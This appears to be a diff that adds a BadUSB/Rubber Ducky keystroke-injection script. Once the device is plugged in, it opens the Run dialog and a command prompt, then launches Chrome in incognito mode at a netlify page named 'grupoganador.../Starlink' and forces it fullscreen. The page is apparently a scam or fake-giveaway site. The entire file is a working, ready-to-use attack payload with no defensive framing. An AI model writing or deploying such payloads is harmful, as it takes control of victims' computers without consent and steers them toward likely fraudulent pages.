@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r 
+DELAY 500
+STRING cmd
+ENTER
+DELAY 2000
+STRING start chrome -incognito --new-window grupoganador.netlify.app/Starlink
+ENTER 
+DELAY 1000
+F11
